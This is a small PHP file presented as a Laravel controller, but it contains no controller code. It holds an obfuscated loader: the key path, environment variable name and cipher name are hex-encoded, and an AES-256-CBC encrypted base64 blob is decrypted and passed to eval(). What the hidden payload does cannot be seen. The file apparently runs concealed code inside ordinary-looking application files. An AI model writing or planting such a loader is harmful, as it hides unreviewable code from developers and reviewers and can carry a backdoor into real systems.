<?php
namespace App\Http\Controllers;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('8W/VMuWJ1JtYOWh4D3E61A==');

$c=base64_decode(

'5ZpxJ9G4W6L/3lXXK/EH3M2wxWsBSPtv8H1OJdAUwbrMAvLyGMsKaDXln/gYNYUHsLSrDy4OYiAU' .
'g9DN5rhDTHBUU7xjUa/pJFE2hpe4Ln0obc2qw2SC9t2rFu2EjyFFVpsnsWWNSQwKzve+x6V7ADxJ' .
'DiZiZFKksOgKzkSkkgx8qAjNQsloyoIIEb5An0b+zFplYE46FVgwKHvFNDyPA+bONVsoHJs6DyKS' .
'ySrdLZcIvlgLMmMCVxHMGJttP7m0V32GRqTNJZ2o/f7ia488gQ=='

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

